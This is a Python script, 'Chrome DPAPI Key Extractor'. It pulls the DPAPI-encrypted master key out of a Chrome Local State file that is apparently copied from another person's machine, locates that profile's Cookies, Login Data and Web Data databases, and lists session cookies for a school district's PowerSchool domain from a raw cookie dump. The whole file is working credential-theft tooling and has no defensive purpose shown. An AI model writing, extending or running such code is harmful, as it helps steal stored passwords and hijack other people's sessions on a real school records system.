#!/usr/bin/env python3
"""
Script to search for Chrome encryption keys in Local State file
and extract DPAPI-encrypted data
"""

import os
import sys
import json
import base64
from pathlib import Path

def extract_chrome_encryption_key():
    """
    Extract the Chrome encryption key from Local State file
    """
    chrome_path = "/workspaces/JaiziahGreene/Lil samson bro/Local/Google/Chrome/User Data"
    local_state_path = os.path.join(chrome_path, "Local State")
    
    print(f"[*] Searching for Chrome encryption key in: {local_state_path}")
    
    if not os.path.exists(local_state_path):
        print(f"[-] Local State file not found at: {local_state_path}")
        return None
    
    try:
        # Read the Local State file
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        # Extract the encrypted key
        encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
        if not encrypted_key:
            print(f"[-] No encrypted_key found in Local State file")
            return None
        
        print(f"[+] Found encrypted key: {encrypted_key}")
        
        # The key is Base64 encoded
        encrypted_key = base64.b64decode(encrypted_key)
        
        # The key has a 'DPAPI' prefix (5 bytes) that needs to be removed
        if encrypted_key.startswith(b'DPAPI'):
            print(f"[+] Key has DPAPI prefix, removing first 5 bytes")
            encrypted_key = encrypted_key[5:]
        
        print(f"[+] DPAPI-encrypted key: {encrypted_key.hex()}")
        
        # Write the encrypted key to a file for further analysis
        with open("chrome_dpapi_key.bin", "wb") as f:
            f.write(encrypted_key)
        
        print(f"[+] Encrypted key saved to chrome_dpapi_key.bin")
        
        return {
            "encrypted_key_base64": base64.b64encode(encrypted_key).decode('utf-8'),
            "encrypted_key_hex": encrypted_key.hex()
        }
    
    except Exception as e:
        print(f"[-] Error extracting Chrome encryption key: {str(e)}")
        return None

def find_encrypted_cookies():
    """
    Find Chrome's encrypted cookies and other sensitive data
    """
    chrome_path = "/workspaces/JaiziahGreene/Lil samson bro/Local/Google/Chrome/User Data"
    default_profile = os.path.join(chrome_path, "Default")
    
    encrypted_files = {
        "cookies": os.path.join(default_profile, "Cookies"),
        "login_data": os.path.join(default_profile, "Login Data"),
        "web_data": os.path.join(default_profile, "Web Data")
    }
    
    print(f"\n[*] Searching for encrypted Chrome database files...")
    
    results = {}
    for name, file_path in encrypted_files.items():
        if os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            print(f"[+] Found {name}: {file_path} ({file_size} bytes)")
            results[name] = {
                "path": file_path,
                "size": file_size
            }
        else:
            print(f"[-] {name} not found at {file_path}")
    
    return results

def search_raw_cookies():
    """
    Search for cookies in the raw_cookies.txt file
    """
    raw_cookies_path = "/workspaces/JaiziahGreene/raw_cookies.txt"
    
    print(f"\n[*] Searching for cookies in: {raw_cookies_path}")
    
    if not os.path.exists(raw_cookies_path):
        print(f"[-] raw_cookies.txt not found at: {raw_cookies_path}")
        return None
    
    try:
        with open(raw_cookies_path, 'r', encoding='utf-8') as f:
            cookie_data = f.read()
        
        cookie_lines = cookie_data.splitlines()
        cookie_count = len(cookie_lines)
        
        print(f"[+] Found {cookie_count} cookies in raw_cookies.txt")
        
        powerschool_cookies = []
        for line in cookie_lines:
            if "sishrsb.ednet.ns.ca" in line:
                parts = line.split("|")
                if len(parts) >= 3:
                    domain, name, value = parts[0], parts[1], parts[2]
                    powerschool_cookies.append({
                        "domain": domain,
                        "name": name,
                        "value": value[:20] + "..." if len(value) > 20 else value
                    })
        
        print(f"[+] Found {len(powerschool_cookies)} PowerSchool cookies:")
        for cookie in powerschool_cookies:
            print(f"    - {cookie['domain']} | {cookie['name']} | {cookie['value']}")
        
        return {
            "total_cookies": cookie_count,
            "powerschool_cookies": powerschool_cookies
        }
    
    except Exception as e:
        print(f"[-] Error searching raw cookies: {str(e)}")
        return None

def main():
    print("Chrome DPAPI Key Extractor")
    print("=========================\n")
    
    # Extract the Chrome encryption key
    encryption_key = extract_chrome_encryption_key()
    
    # Find encrypted database files
    encrypted_files = find_encrypted_cookies()
    
    # Search for raw cookies
    raw_cookies = search_raw_cookies()
    
    # Save combined results
    results = {
        "chrome_encryption_key": encryption_key,
        "encrypted_files": encrypted_files,
        "raw_cookies": raw_cookies
    }
    
    with open("chrome_dpapi_analysis.json", "w") as f:
        json.dump(results, f, indent=4)
    
    print(f"\n[+] Analysis results saved to chrome_dpapi_analysis.json")

if __name__ == "__main__":
    main()
